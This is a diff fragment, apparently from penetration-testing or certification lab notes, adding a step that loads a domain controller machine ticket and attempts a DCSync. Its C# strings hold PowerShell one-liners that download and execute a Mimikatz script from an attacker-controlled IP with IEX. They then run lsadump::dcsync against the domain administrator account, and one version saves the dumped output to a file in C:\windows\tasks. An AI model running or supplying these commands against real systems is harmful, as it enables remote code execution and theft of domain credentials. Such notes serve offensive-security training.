@@ -45,3 +45,15 @@ String cmd2 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.
 
 
 
+5) Load the DC machine account ticket into your current domain user; and attempt to DCSync
+
+```csharp
+// Watch the quotation marks! 
+String cmd2 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/mimikatz.txt') | IEX; Invoke-Mimikatz -Command "`"lsadump::dcsync /domain:infinity.com /user:infinity\\administrator`""";
+```
+
+```csharp
+String cmdmimi = "lsadump::dcsync /domain:infinity.com /user:infinity\\administrator";
+
+String cmd2 = $"(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/mimikatz.txt') | IEX; Invoke-Mimikatz -Command {cmdmimi} | Out-File -FilePath C:\\windows\\tasks\\dcsync.txt";
+```
